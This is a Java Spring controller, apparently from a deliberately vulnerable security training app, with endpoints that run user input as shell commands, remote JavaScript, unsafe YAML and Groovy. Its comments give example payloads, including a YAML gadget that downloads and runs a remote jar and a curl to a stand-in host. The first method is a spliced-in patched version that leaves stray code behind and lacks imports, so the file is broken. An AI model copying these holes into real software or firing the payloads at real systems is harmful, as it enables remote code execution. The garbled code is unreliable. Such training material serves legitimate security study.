package org.joychou.controller;

import groovy.lang.GroovyShell;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@RestController
@RequestMapping("/rce")
public class Rce {

@GetMapping("/runtime/exec")
public String CommandExec(String cmd) {
    // Input validation - reject empty or null commands
    if (StringUtils.isBlank(cmd)) {
        return "Command cannot be empty";
    }
    
    // Define a whitelist of allowed commands
    List<String> allowedCommands = Arrays.asList("ls", "dir", "date", "whoami");
    
    // Extract the base command (first word before any arguments)
    String baseCommand = cmd.trim().split("\\s+")[0];
    
    // Check if the command is in the whitelist
    if (!allowedCommands.contains(baseCommand)) {
        return "Command not allowed for security reasons";
    }
    
    // Use ProcessBuilder instead of Runtime.exec for better security
    // and to avoid command injection through shell interpretation
    List<String> commandWithArgs = new ArrayList<>();
    for (String part : cmd.trim().split("\\s+")) {
        commandWithArgs.add(part);
    }
    
    StringBuilder sb = new StringBuilder();
    try {
        ProcessBuilder processBuilder = new ProcessBuilder(commandWithArgs);
        // Merge error and output streams
        processBuilder.redirectErrorStream(true);
        
        Process p = processBuilder.start();
        BufferedReader inBr = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String tmpStr;
        
        while ((tmpStr = inBr.readLine()) != null) {
            sb.append(tmpStr).append("\n");
        }
        
        if (p.waitFor() != 0) {
            if (p.exitValue() == 1)
                return "Command exec failed!!";
        }
        
        inBr.close();
    } catch (Exception e) {
        return "Error: " + e.toString();
    }
    return sb.toString();
}

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/ProcessBuilder?cmd=whoami
     * @param cmd cmd
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }

}

